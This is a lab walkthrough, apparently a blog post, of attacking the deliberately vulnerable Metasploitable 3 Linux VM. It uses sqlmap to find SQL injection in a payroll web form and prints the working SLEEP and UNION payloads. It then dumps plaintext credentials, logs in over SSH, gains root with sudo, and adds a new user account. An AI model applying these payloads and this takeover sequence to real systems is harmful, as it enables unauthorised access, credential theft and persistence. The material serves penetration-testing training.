---
title: SQL Injection on Payroll Web Application
date: 2023-08-18
description: SQL Injection on Payroll Web Application
tags: 
    - Metasploitable3 Linux Edition
    - SQL Injection
    - sqlmap
categories:
    - Metasploitable3 Linux Edition
    - Parrot OS
toc: false
---

## Target: Metasploitable 3 Linux

## Tool: SQLmap

## Vulnerability: SQL Injection

SQL Injection on Payroll Web Application using SQLmap

An open-source program called SQLmap is used in penetration tests to find and take advantage of injection vulnerabilities. Because SQLmap automates the process of identifying and taking advantage of SQL injection, it is especially helpful in saving time.

```shell

┌─[parrot@parrot]─[~]
└──╼ $sqlmap
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Usage: python3 sqlmap [options]

sqlmap: error: missing a mandatory option (-d, -u, -l, -m, -r, -g, -c, --wizard, --shell, --update, --purge, --list-tampers or --dependencies). Use -h for basic and -hh for advanced help

[12:48:05] [WARNING] your sqlmap version is outdated
┌─[✗]─[parrot@parrot]─[~]
└──╼ $sqlmap -u http://10.0.2.28/payroll_app.php --forms --dbs
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:50:06 /2024-03-03/

[12:50:06] [INFO] testing connection to the target URL
[12:50:06] [INFO] searching for forms
[1/1] Form:
POST http://10.0.2.28/payroll_app.php
POST data: user=&password=&s=OK
do you want to test this form? [Y/n/q] 
> Y

do you want to fill blank fields with random values? [Y/n] Y
[12:50:50] [INFO] using '/home/parrot/.local/share/sqlmap/output/results-03032024_1250pm.csv' as the CSV results file in multiple targets mode
[12:50:50] [INFO] checking if the target is protected by some kind of WAF/IPS
[12:50:50] [INFO] testing if the target URL content is stable
[12:50:51] [INFO] target URL content is stable
[12:50:51] [INFO] testing if POST parameter 'user' is dynamic
[12:50:51] [WARNING] POST parameter 'user' does not appear to be dynamic
[12:50:51] [WARNING] heuristic (basic) test shows that POST parameter 'user' might not be injectable
[12:50:51] [INFO] testing for SQL injection on POST parameter 'user'
[12:50:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:50:51] [WARNING] reflective value(s) found and filtering out
[12:50:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:50:51] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:50:52] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:50:52] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[12:50:52] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[12:50:52] [INFO] testing 'Generic inline queries'
[12:50:52] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:50:52] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[12:50:53] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[12:50:53] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:51:03] [INFO] POST parameter 'user' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[12:51:23] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:51:23] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[12:51:23] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[12:51:23] [INFO] target URL appears to have 4 columns in query
[12:51:23] [INFO] POST parameter 'user' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable

sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
---
Parameter: user (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=CGYY' AND (SELECT 9858 FROM (SELECT(SLEEP(5)))lNho) AND 'xRHP'='xRHP&password=&s=OK

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: user=CGYY' UNION ALL SELECT CONCAT(0x717a707a71,0x6f5763664f6a6a4e714e636a4c52676d6f584a5a4f7371786c46504a4b69744c4d4975564474554b,0x71766a7071),NULL,NULL,NULL-- -&password=&s=OK
---
do you want to exploit this SQL injection? [Y/n] Y
[12:51:54] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.4.5
back-end DBMS: MySQL >= 5.0.12
[12:51:54] [INFO] fetching database names
available databases [5]:
[*] drupal
[*] information_schema
[*] mysql
[*] payroll
[*] performance_schema

[12:51:54] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/parrot/.local/share/sqlmap/output/results-03032024_1250pm.csv'
[12:51:54] [WARNING] your sqlmap version is outdated

[*] ending @ 12:51:54 /2024-03-03/

┌─[parrot@parrot]─[~]
└──╼ $sqlmap -u http://10.0.2.28/payroll_app.php --forms --dump payroll
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:52:58 /2024-03-03/

[12:52:58] [INFO] testing connection to the target URL
[12:52:58] [INFO] searching for forms
[1/1] Form:
POST http://10.0.2.28/payroll_app.php
POST data: user=&password=&s=OK
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: user=&password=&s=OK] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] Y
[12:53:34] [INFO] resuming back-end DBMS 'mysql' 
[12:53:34] [INFO] using '/home/parrot/.local/share/sqlmap/output/results-03032024_1253pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=CGYY' AND (SELECT 9858 FROM (SELECT(SLEEP(5)))lNho) AND 'xRHP'='xRHP&password=&s=OK

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: user=CGYY' UNION ALL SELECT CONCAT(0x717a707a71,0x6f5763664f6a6a4e714e636a4c52676d6f584a5a4f7371786c46504a4b69744c4d4975564474554b,0x71766a7071),NULL,NULL,NULL-- -&password=&s=OK
---
do you want to exploit this SQL injection? [Y/n] Y
[12:53:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.4.5, Apache 2.4.7
back-end DBMS: MySQL >= 5.0.12
[12:53:37] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[12:53:37] [INFO] fetching current database
[12:53:37] [WARNING] reflective value(s) found and filtering out
[12:53:37] [INFO] fetching tables for database: 'payroll'
[12:53:37] [INFO] fetching columns for table 'users' in database 'payroll'
[12:53:37] [INFO] fetching entries for table 'users' in database 'payroll'
Database: payroll
Table: users
[15 entries]
+--------+-------------------------+------------------+------------+------------+
| salary | password                | username         | last_name  | first_name |
+--------+-------------------------+------------------+------------+------------+
| 9560   | help_me_obiwan          | leia_organa      | Organa     | Leia       |
| 1080   | like_my_father_beforeme | luke_skywalker   | Skywalker  | Luke       |
| 1200   | nerf_herder             | han_solo         | Solo       | Han        |
| 22222  | b00p_b33p               | artoo_detoo      | Detoo      | Artoo      |
| 3200   | Pr0t0c07                | c_three_pio      | Threepio   | C          |
| 10000  | thats_no_m00n           | ben_kenobi       | Kenobi     | Ben        |
| 6666   | Dark_syD3               | darth_vader      | Vader      | Darth      |
| 1025   | but_master:(            | anakin_skywalker | Skywalker  | Anakin     |
| 2048   | mesah_p@ssw0rd          | jarjar_binks     | Binks      | Jar-Jar    |
| 40000  | @dm1n1str8r             | lando_calrissian | Calrissian | Lando      |
| 20000  | mandalorian1            | boba_fett        | Fett       | Boba       |
| 65000  | my_kinda_skum           | jabba_hutt       | Hutt       | Jaba       |
| 50000  | hanSh0tF1rst            | greedo           | Rodian     | Greedo     |
| 4500   | rwaaaaawr8              | chewbacca        | <blank>    | Chewbacca  |
| 6667   | Daddy_Issues2           | kylo_ren         | Ren        | Kylo       |
+--------+-------------------------+------------------+------------+------------+

[12:53:37] [INFO] table 'payroll.users' dumped to CSV file '/home/parrot/.local/share/sqlmap/output/10.0.2.28/dump/payroll/users.csv'
[12:53:37] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/parrot/.local/share/sqlmap/output/results-03032024_1253pm.csv'
[12:53:37] [WARNING] your sqlmap version is outdated

[*] ending @ 12:53:37 /2024-03-03/

```

Connect using SSH. Select a username and password from the lists above

```shell

┌─[parrot@parrot]─[~]
└──╼ $ssh leia_organa@10.0.3.6
The authenticity of host '10.0.3.6 (10.0.3.6)' can't be established.
ED25519 key fingerprint is SHA256:Rpy8shmBT8uIqZeMsZCG6N5gHXDNSWQ0tEgSgF7t/SM.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.3.6' (ED25519) to the list of known hosts.
leia_organa@10.0.3.6's password: 
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
New release '16.04.7 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


leia_organa@metasploitable3-ub1404:~$ uname -a
Linux metasploitable3-ub1404 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
leia_organa@metasploitable3-ub1404:~$ sudo -s
[sudo] password for leia_organa: 
root@metasploitable3-ub1404:~# 
```

Add new user

```shell
root@metasploitable3-ub1404:~# adduser abril
Adding user `abril' ...
Adding new group `abril' (1000) ...
Adding new user `abril' (1000) with group `abril' ...
Creating home directory `/home/abril' ...
Copying files from `/etc/skel' ...
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
Changing the user information for abril
Enter the new value, or press ENTER for the default
 Full Name []: abril jordan casinillo
 Room Number []: 47
 Work Phone []: 123456789
 Home Phone []: 123456789
 Other []: 14344
Is the information correct? [Y/n] Y
root@metasploitable3-ub1404:~# su - abril
abril@metasploitable3-ub1404:~$ 

```
